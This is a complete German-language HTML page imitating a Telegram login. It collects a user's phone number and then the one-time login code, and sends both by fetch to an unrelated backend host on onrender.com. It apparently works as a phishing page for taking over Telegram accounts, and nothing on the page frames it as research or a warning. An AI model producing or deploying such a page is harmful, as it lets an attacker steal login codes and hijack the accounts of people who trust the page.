<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
        #loader { display: none; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card" id="step1">
        <h2>Telegram Login</h2>
        <input type="text" id="phone" placeholder="+49123456789">
        <button onclick="sendOTP()">Weiter</button>
    </div>

    <div class="card" id="step2" style="display:none;">
        <h3>Code eingeben</h3>
        <input type="text" id="otp" placeholder="Code">
        <button onclick="verifyOTP()">Verifizieren</button>
    </div>

    <div id="loader">
        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ2ZzZng4bHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxxHOGTdzJC/giphy.gif" width="50">
        <p>Lade...</p>
    </div>

    <script>
        let phone = "";
        const BACKEND = "https://telegram-backend-yr2r.onrender.com";

        async function sendOTP() {
            phone = document.getElementById('phone').value;
            document.getElementById('loader').style.display = 'block';
            const res = await fetch(`${BACKEND}/send-otp`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phoneNumber: phone })
            });
            if(res.ok) {
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            } else {
                alert('Fehler: Nummer ungültig');
            }
            document.getElementById('loader').style.display = 'none';
        }

        async function verifyOTP() {
            const otp = document.getElementById('otp').value;
            document.getElementById('loader').style.display = 'block';
            const res = await fetch(`${BACKEND}/verify-otp`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phoneNumber: phone, otp: otp })
            });
            if(res.ok) {
                alert('Erfolgreich!');
            } else {
                alert('Fehler: Code ungültig');
            }
            document.getElementById('loader').style.display = 'none';
        }
    </script>
</body>
</html>
